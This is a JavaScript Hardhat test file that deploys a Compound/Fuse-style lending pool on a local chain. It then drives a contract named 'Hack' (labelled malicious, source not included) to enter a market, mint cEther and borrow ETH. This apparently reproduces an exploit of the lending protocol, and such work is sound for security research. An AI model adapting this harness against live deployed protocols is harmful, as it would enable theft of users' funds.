const { web3, assert } = require("hardhat");

const FuseAdminDeployer = artifacts.require('FuseAdminDeployer');
const Unitroller = artifacts.require('Unitroller');
const Comptroller = artifacts.require('Comptroller');
const JumpRateModel = artifacts.require('JumpRateModel');
const CEtherDelegate = artifacts.require('CEtherDelegate');
const FuseFeeDistributor = artifacts.require('FuseFeeDistributor');
const SimplePriceOracle = artifacts.require('SimplePriceOracle');
const Hack = artifacts.require('Hack');
const CEther = artifacts.require('CEther');
const BigNumber = require('bn.js');

describe('DappDeployment and initialization', () => {
    let fuseAdmin, deployer, accounts, cunitroller, EOAboss, unitroller, calldata, interestmodel, priceoracle, cetherdelegate, cether;

    before(async() => {
        accounts = await web3.eth.getAccounts();
        EOAboss = accounts[1];
        //deploy fusefeedistributor and initalize admin
        deployer = await FuseAdminDeployer.new();
        await deployer.deployFuseAdmin();
        fuseAdmin = await deployer.fuseadmin.call({from: EOAboss});
        await deployer.initializeFeeDistributorAndAdmin(2, {from: EOAboss});
        fusefeedistributor = await FuseFeeDistributor.at('0xa16E02E87b7454126E5E10d957A927A7F5B5d2be');
    })

    describe('Comptroller proxy/logic deployment and initalization', () => {
        it('should deployer comptroller proxy/storage', async () => {
            unitroller = await Unitroller.new({from:EOAboss});
            cunitroller = await Comptroller.at(unitroller.address);
            assert.equal(await unitroller.admin.call(), accounts[1]);
        })

        it('should deploy comptroller logic/implementation', async () => {
            comptroller = await Comptroller.new({from:EOAboss, gas:30000000, gasPrice:800000000});
        })

        it('should add the implementation on the implementations whitelist', async () => {
            //console.log(comptroller.address);
            //set new implementation in comptrollerImplementationWhitelist in FuseFeeDistributor, from owner which is the deployer contract
            await deployer.editComptrollerImplementationWhitelist(comptroller.address);
            //call _setPendingImplementation on unitroller from admin EOABOSS
            await unitroller._setPendingImplementation(comptroller.address, {from:EOAboss, gas:30000000, gasPrice:800000000});            
            assert.equal(await unitroller.pendingComptrollerImplementation.call(), comptroller.address);
        })

        it('should accept new implementation', async () => {
            await comptroller._become(unitroller.address, {from:EOAboss});
            assert.equal(await unitroller.comptrollerImplementation.call(), comptroller.address);
        })

        it('should check if oldImplementation a', async () => {
            comptrollerimplementation = await unitroller.comptrollerImplementation.call();
            assert.equal(await fusefeedistributor.latestComptrollerImplementation(comptrollerimplementation), comptrollerimplementation);
        })

        it('should deploy the interest rate model and initialize it on comptroller', async () => {
            interestmodel = await JumpRateModel.new(12, 2, 4, 81);
            console.log('interest rate model address is : %s', interestmodel.address);
        })

        it('should deploy CEtherDelegate logic/implementation of CEther', async () => {
            cetherdelegate = await CEtherDelegate.new();
            console.log('CEther logic address is: %s', cetherdelegate.address);
        })

        it('should encode constructordata to pass as calldata to deployCether', async () => {
            calldata = await deployer.encode(unitroller.address,
                                interestmodel.address,
                                'cEther',
                                'cETH',
                                cetherdelegate.address,
                                '0x00',
                                5,
                                1);
            
            //console.log(calldata);            
        })

        it('should decode constructordata', async () => {
            decoded = await deployer.decode(calldata);
            //console.log(decoded);
        })

        it('should add the cetherdelegate/logic to cether implementation whitelist on fuseadmin', async () => {
            await deployer.editcEtherImplementationWhitelist(cetherdelegate.address);
            //console.log(await fusefeedistributor.cEtherDelegateWhitelist('0x0000000000000000000000000000000000000000',cetherdelegate.address,true));
        })

        it('should deploy priceoracle and set it on comptroller', async () => {
            priceoracle = await SimplePriceOracle.new();
            await cunitroller._setPriceOracle(priceoracle.address, {from:EOAboss});
            //await deployer.setPriceOracle(cunitroller.address, priceoracle.address, {from:EOAboss});
            assert.equal(await cunitroller.oracle.call(), priceoracle.address);
        })

        it('should deploy a new CEther token market', async () => {
            await cunitroller._deployMarket(true, calldata, 8, {from:EOAboss, gas:30000000, gasPrice:800000000});
            cether = '0x26296dd4affd47bdfbfcd5acfb29bb731f0ca12d';
            console.log('getallmarkets %s', await cunitroller.getAllMarkets.call());
            console.log('porco dio', await cunitroller.allMarkets(0));
        })

        it('should return CETH underlying price', async () => {
            console.log('hacker underlying is : %s',web3.utils.fromWei(await priceoracle.getUnderlyingPrice(cether), 'ether'));
            
        })

        it( 'should return collateralFactorMantissa of the market', async () => {
            console.log(await cunitroller.markets(cether));
            //console.log(await cunitroller.allMarkets(cetherdelegate.address));
            
        })

        describe('Entering Markets and minting CEther', () => {
            let hack;
            it('should deploy malicious contract adn send it some eth', async () => {
                hack = await Hack.new(comptroller.address, cether);
                await hack.send(web3.utils.toWei('20', "ether"), {from:accounts[2]});
                assert.equal(await web3.eth.getBalance(hack.address), web3.utils.toWei('20', 'ether'));
            })

            it('should let the attacker enter a market', async () => {
                await hack.enterMarket();
                await hack.checkAllMarkets;
    
            })

            it('should mint cether for eth', async () => {
                await hack.callMint();
                cetherdelegator = await CEther.at(cether);
                //console.log(await cetherdelegator.balanceOf(hack.address));
                //console.log(await hack.getCEthBalance.call());
                x = parseInt(await hack.getCEthBalance.call());
                console.log('hacker CEth contract balance after mint is %s', web3.utils.fromWei(await hack.getCEthBalance.call(), "ether"));
                assert.isAtLeast(parseInt(x), 0);
                assert.equal(await web3.eth.getBalance(cetherdelegator.address), web3.utils.toWei('10', 'ether'));
            })

            it('should borrow eth for CEth', async() => {
                await hack.callBorrow();
                console.log('hacker eth balance after borrow is: %s', await web3.eth.getBalance(hack.address));
                console.log('hacker CEth contract balance after borrow is %s', web3.utils.fromWei(await hack.getCEthBalance.call(), "ether"));
                //console.log('get balance of underlying', await cetherdelegator.balanceOfUnderlying(hack.address));

            })

        })

    })

    
})